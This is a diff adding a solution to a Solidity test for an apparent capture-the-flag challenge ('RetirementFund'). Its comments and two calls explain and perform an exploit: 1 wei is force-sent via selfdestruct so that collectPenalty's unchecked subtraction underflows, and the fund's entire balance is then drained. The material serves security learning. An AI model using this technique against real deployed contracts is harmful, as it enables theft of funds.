@@ -21,6 +21,21 @@ contract RetirementFundTest is Test {
 
         // Put your solution here
 
+        // The collectPenalty method is vulnerable to overflow
+        //
+        // The penalty is calculated by subtracting the current balance from the initial balance
+        // without checking if the current balance is greater than the initial balance.
+
+        // 1. Top up the retirementFund with 1 wei to increase the balance enough to overflow
+        //
+        // Since the retirementFund contract has no payable function, we can use the selfdestruct method
+        // on the exploitContract
+        exploitContract.destroy{value: 1 wei}();
+
+        // 2. Collect the penalty
+        // It will send the all the balance of the retirementFund to the exploitContract
+        retirementFund.collectPenalty();
+
         _checkSolved();
     }
 
